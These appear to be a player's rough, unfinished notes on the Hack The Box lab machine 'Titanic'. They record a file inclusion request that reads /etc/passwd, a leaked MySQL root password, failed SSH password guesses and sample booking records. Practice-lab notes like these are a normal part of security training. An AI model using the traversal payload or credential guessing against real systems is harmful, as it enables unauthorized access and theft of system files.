
Titanic

10.10.11.55
titanic.htb

ports 22, 80

lfi - `//download?ticket=/etc/passwd`

developer:x:1000:1000:developer:/home/developer:/bin/bash

dev.titanic.htb
possible user: administrator

`MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'`

have to test it (added tried paswords)
```sh
┌──(kali㉿proxli)-[~]
└─$ ssh administrator@titanic.htb                                                     
The authenticity of host 'titanic.htb (10.10.11.55)' can't be established.
ED25519 key fingerprint is SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'titanic.htb' (ED25519) to the list of known hosts.
administrator@titanic.htb's password: MySQLP@$$w0rd!
Permission denied, please try again.
administrator@titanic.htb's password: admin
Permission denied, please try again.
administrator@titanic.htb's password: password123

```
oups, this or something right here totally crashed the ssh server. it's still hanging and
```sh
┌──(kali㉿proxli)-[~]
└─$ ssh developer@titanic.htb
ssh: connect to host titanic.htb port 22: Connection refused
```
works again after a long time

trying again, odd
```sh
┌──(kali㉿proxli)-[~]
└─$ ssh developer@titanic.htb
developer@titanic.htb's password: 
Connection closed by 10.10.11.55 port 22
                                                                                                               
┌──(kali㉿proxli)-[~]
└─$ ssh developer@titanic.htb
developer@titanic.htb's password: 
Permission denied, please try again.
developer@titanic.htb's password: 
Permission denied, please try again.
developer@titanic.htb's password: 
developer@titanic.htb: Permission denied (publickey,password).
                                                                                                               
┌──(kali㉿proxli)-[~]
└─$ ssh developer@titanic.htb
ssh: connect to host titanic.htb port 22: Connection refused
                                                                                                               
┌──(kali㉿proxli)-[~]
└─$ ssh developer@titanic.htb
ssh: connect to host titanic.htb port 22: Connection refused
```
it seems to refuse for a bit after trying to connect

![[Images/Pasted image 20250327152948.png]]

```json
{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}
```

```json
{"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}
```

